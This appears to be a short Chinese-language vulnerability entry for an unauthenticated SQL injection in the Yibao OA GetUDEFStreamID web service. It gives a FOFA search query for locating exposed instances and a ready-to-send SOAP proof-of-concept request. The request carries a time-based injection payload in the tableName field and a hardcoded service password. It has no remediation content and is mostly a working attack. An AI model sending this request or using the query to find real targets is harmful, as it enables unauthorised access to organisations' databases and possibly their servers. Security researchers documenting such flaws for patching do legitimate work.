## 易宝OA-GetUDEFStreamID存在SQL注入漏洞

易宝OA GetUDEFStreamID 接口存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。


## fofa

```yaml
app="顶讯科技-易宝OA系统"
```

## poc

```java
POST /WebService/BasicService.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetUDEFStreamID"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUDEFStreamID xmlns="http://tempuri.org/">
      <tableName>';WAITFOR DELAY '0:0:5'--</tableName>
      <webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>
    </GetUDEFStreamID>
  </soap:Body>
</soap:Envelope>
```

